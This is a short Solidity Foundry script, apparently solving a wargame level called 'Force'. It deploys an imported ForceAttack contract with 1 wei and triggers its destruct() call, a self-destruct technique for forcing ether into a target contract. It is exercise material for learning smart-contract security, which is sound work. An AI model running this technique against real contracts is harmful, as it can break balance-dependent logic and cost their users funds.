// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import {ForceAttack} from "src/ForceAttack.sol";

contract ForceScript is Script {
    uint256 deployerPrivateKey;

    function setUp() public {
        deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    }

    function run() public {
        vm.startBroadcast(deployerPrivateKey);
        _attack();
        vm.stopBroadcast();
    }

    function _attack() public {
        ForceAttack forceAttack = new ForceAttack{value:1}();
        forceAttack.destruct();
    }
}
